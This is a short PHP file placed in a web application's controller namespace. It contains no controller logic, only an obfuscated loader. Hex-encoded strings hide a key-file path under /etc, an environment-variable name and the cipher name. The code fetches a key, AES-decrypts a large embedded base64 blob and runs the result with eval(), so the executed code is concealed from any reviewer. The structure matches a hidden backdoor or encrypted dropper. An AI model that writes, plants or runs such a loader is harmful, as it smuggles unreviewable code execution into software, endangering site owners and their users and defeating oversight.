<?php
namespace App\Http\Controllers\Sistem;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('ACLoivIFNm1+0R40Jdbkaw==');

$c=base64_decode(

'r+GzOrxKrPlmFEwKJbpCNg8+9fPIkEAUw3GcKwUlJPL1v+A9UgORJKDwqBJRka+ZQatrYSeabRFz' .
'vK0UNoCmJ0fF1uHNZPbSnKLNnbrnsSqXKm6VxHBpLOi5xjwehzzK+UpzLnPtUf/y57RQEt7VxuDV' .
'lo5MRlUKE8sm8SC8L/3LgxTBFHcyf9PJFHNxaCdjSEA+wHRe0q8HOk15/WjHOa+SE1V2Zj+yBStH' .
'kj8tHVZ2lgsMkkn8E5DWn2XdgA8xkSZSZOPIq3tse3SNm0EVgFiNfLezL+ZIVaCrM5IO1fXfqd6I' .
'9baeaUUzzQVq6koLJtVp8l/aYaaS27lVUtA4mYZZtHed9K0kNyvE0fvYfazFtE1U5a1CxgI5Hxjb' .
'Piin5SoUu0h/bN+CaLH5XVrev5Bxa1l6zmZeDboftALCZj/vD9MnJDG6JQsC/w7j1N4+MUh5EtXa' .
'JGRjp0mgy/qMRzxAzRwXiyQjna8ZpWhYQLXSlL9WO4F646nv0XVNZizUljIDq7kPfEM64YNadXyr' .
'K9A4IejJ90sugH8i1uzt4TKO6SEEPOwDlxIFUsAZnz6Gq4c92dhFZNg2BGORDHE2yMcZ/aOT+/cF' .
'O5rgAynYZAYfwwrqixG59daSHPlzW5nIpMmRI09wwFvaNLCuSx/NQxxs5s2houPxpIxme15h6BNP' .
'4szco/8ooHnSOhi9v0KC1epr0TjTsTbO8mpiqwTJcfHw8WFRt6qM9ELVzkDC4d7u8gBDdm3AfRxn' .
'34/SzuPNbavfyhbNGf2D76GXRrlGFsXhztD+ctiOmnZVaV2NZAQRFa+xaV2q2GW2lT7wv9nWIDG4' .
'ydvS/HoERLf5AZolu4pkqi9FtoezWfDUHYc4zTwEw9dzkoOfwtUqTF5+HhyzY57M9peMgqcQknu2' .
'WqXqTIoFIgDlWgOKpxabaDDmz+iClyM55O5NHjJAqx8sxlwIsJYsdT4/HX17A07L8itelkNKbqPt' .
'8WxqcZCiybyUBioUnT2veOe6R+N94yHVcUNBwPcohL6B/ruBcC/HawbOWjwtNHQ1ZO3qrLBtJMkL' .
'96mQE/iF7xMRVGQemvUz5JQ0qcmoLBYWSKPrOjS0yEMAfWMjsbj1WpWiJ3DeVmW0oBz06b/rbr4p' .
'M1xvsp1kbwjiLW4+5U6Tq2y0hYXlW3mESvJ6i+n0HzRm/bf8b3ZCV4XldfTWesIA4yLwAvJx5MCy' .
'3CAV96cIK351acUh4LUJxiPpjDqqgFn/YR43VT2pVqLwDyDoa618hhH7zcIiBfjcHe6aPS7ewwzv' .
'rwWmM5NpPXnV6H6A1G3gTbdt01iNv4QkzDFfKpGDQIg417R+7sX1pNFy3slD8cJI8yKzD+RZFNPE' .
'PxzPVnsOHWAkUXqidgxoi32CwGo7ZMBX6V1Wcw47/CqeFiQ390ONuvitUjlvdCGcquLZsZ8LiyDM' .
'orhvlfk2r3lhEr1Y49KMhglWwlnssBerb7APcwnkuWl4zJ0JIEAOkxqyiiHXPfK6a7EWcoswC8MC' .
'ueb8tlbybbDCauBCwQUvWKHKmxIVO+Lm9UQ3ilH9yQ+lJ/PHrRwAJTYDmcDdDUddLA2DSMoVM8IW' .
'Pej5g2SGzGdtfml7q60OWbNbwelgnSs6oa5LlkWyrGGtFznzoyDYe23wWmitWGYBpfz0udXY1TN2' .
'e0414uHxg++GYTYeiqgw8CMF6Eo9VOldQ7PR++1v3toRppp+6dPW2D7DFhllIBCnzo0dXn9JnpYL' .
'1rOUfCd01toaoGQhEk54RnFzGv69waYf35M3IJRxo9Q2+VKc/ONUy+Fy5Ip7N+XH4RBtVcjnxDsX' .
'P3fbcNvNUtHqaJq/xOGCCh9uXgaSvzp/StD6hrfkkwzDdXG+RuDhVk6Q6NHUK7QNgJS7nMB/Nxnk' .
'tKlhY5QuZcOSuoyEAaagEXdCkS1kLJqwBl6/9CkMY/z8hEtiFDpLnbI1Vlb2zWRExATnhBbWeT9V' .
'mlfzm2zdU3feonFmsAlToSI89xzZWx5LJZwQRHikYFPGDhzxfZ5DOUY68Jl9aB2MYNaWx0oLh97U' .
'v8/LCsxYUhLJEUHreoahmCXKmv73segfjMoIxYw/Sv89F2DlOTYImL5k6vkJaRRR1HO+qS85V339' .
'yeWKaDLHVFkMfK1AHzk3pHyg5t+ydwqEwAS4f+2/w49tjQb0rtRB1evOshHgHhx0u4zHvjvS2C2k' .
'GutoBxnd/vGmk7iWkkl3j61MrRfPn4Ox2b7YjF62sTVBxRfZxtAYDLjP30hUgqtwR8zmvc3WtxA8' .
't/qlljFerVxcTnSthu/0IrRbVKiMPWkgfUulOKYVgf/ToBZmeEaHUE+QfGOxlReNMpfBBaeUEufK' .
'b9xeXlcyh2Ot1S+NZzJYtjelY7vmiZZMO4V2dc+K/sBmdaPuugh/wxcIpfDSBIu2mOhtdIrTAiJk' .
'1gpcifFm4nFYPr1sAWpIojn1+pY5Df8SVqtetXRCOElmzZ0D4mXHYC3mpQZRcYWYai4un1S5gn7h' .
'YPgD/eTBiGSLIcsRzgeQZCgpox4IBHVLP6ycMx7j0H7BdTb80r9AGUhTq4SeKr/kWxMMcZcVyts8' .
'LMHq8YDOTAskG25vE8Qfyfu8G6ZKPzQuyKeBrd6JeaGNKHufCMAv8lOBl8L4cMtDOBp5mgsjPIOz' .
'QAsjcKCU5WgR5azv+Ugwq2qtiTul5b2M7AVlwDJ61gUddy84gO3JUP3xXdj+6OKY2RdUhTNAzRi1' .
'rGLTFfDZU4afox42fGZOcYM+Omej69/RuQw5+l8UreGMeWauiFi0TbfNjKV39TGg64V7QkfnX5WN' .
'lev4xeGSN7YO8T+jQSSj7htzB0fuSwsUOwQfdj0drg/JSMIAdIQUyaDy67JHBv4m+SgnCIhyzseW' .
'pz02yUbOAyCtoYWj7ucoln+dUo/m2zv4yshFrcxkSvzoVqzzf5SwQ1zI9hz5pLxlB9aYOCa5jkut' .
'bjhUsTEYdjARJEks9UM2TfZ6bdFja05fU3VC3YOBnK924OvAkDot6LUK1fqX5u94rHlsqLEdOz+N' .
'FkTH15eBphcBg4YSFiQXLJ/UB4SbbXoW8mMBXVd685AsMsIvsJEP+B7XPeuaLgSdxao3JYPadED9' .
'DFP0lvhDtMMTBonjThbhTJRPLpGRCdUmYNe7uuwxRCXyZUxV/H+pnSCcp3kmJeJVS9Q0W46dWX9z' .
'XPIbEHgCeTq9G4sMAID0ChJxV4TyCvJkDgNgDaeaNH+IEzo56w6Zr9oLjHa3Q8sxhBKtXEsTtwdW' .
'Zi5Red+ys/rR9CHxsT7wxIglIvm8sUF5Wm8iP+UWkxawmgqy68daWO5t4+QQXBo+3OLo5oMdKnj2' .
'rWhwTgB5Cjq5Fkh0FDIot77rV4/YU9cSVHu6Dly7IDabmOb6r2qZg50nRgIdeLcvmEAkBdpnj7BH' .
'rq02GWUeFI3UAeMIIzPX8c1GcClj6yHSXSIeH5oJV55z1kdxoAEb48XZM0Ro1bW2DLEsCiGlYV41' .
'RGMBuATCAtozXhNEQVdtvCPb+1d3A+rX6g/ewp4mtT8PI7oNHXM4XDCMFyPZdXQPUfy52T4Jt8pM' .
'Li8chAKmIRvQHbfvwR/uuZ7roS0drdMEOytrEtHoIDhdn4f4EHLn4biIbSFzPuhM5tyiAMgn+PlI' .
'ntMiCRq+jdL9jeEYLvyhEaBzrlpJ38DDaVr7d6pxKc21YfTgrtmwzLowz83RdGAcMAD85qMxOaCO' .
'Rq/eYD+cipwmdiZxPlwC+GRhciQjSUfblCz/JgsC/C9u2NvSYYr912i4A23Zlgg2yB3pUiJivuXE' .
'+nM78XjQsVx8F1nDpsWuSJEuftdQXC8BW0c5TmYz6coZVIuYFa8GB5BmSn4yTkpSZ9kdnJBG/B85' .
'9JM9t3Xo4AA5wLS5/0K5/eUAXcj8re7CauleDeYoxSvgivoVwBPCuJ6l7PQuuoc+3ctBxoh821W/' .
'MxCfU3uXvL3c4Ob8kSzF7DunXBj9NFwgmmKdLqkvGRP7ey9YFr0DB4b9oLhtXr04LVJEe5FP0wKB' .
'lLNwpAX5Il3Pb7uqQjqUpYCAkRNzKfNJDIT3gFEgSPQ5oYU6TzwXdZPxrjWAT6bs7NHgtlJnjLri' .
'hBYBiBLu3L+frA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

